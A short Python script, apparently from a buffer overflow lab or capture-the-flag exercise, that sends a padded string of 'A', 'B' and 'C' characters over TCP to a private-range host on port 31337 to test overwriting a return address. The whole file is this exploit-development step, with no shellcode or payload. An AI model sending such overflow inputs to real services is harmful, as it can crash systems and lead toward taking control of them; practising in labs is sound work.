import socket

input = "A" * 146
input += "B" * 4
input += "C" * 16

input = input.encode("utf-8")
print(input)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("10.10.193.95",31337))
s.send(input)
s.close()
print("done");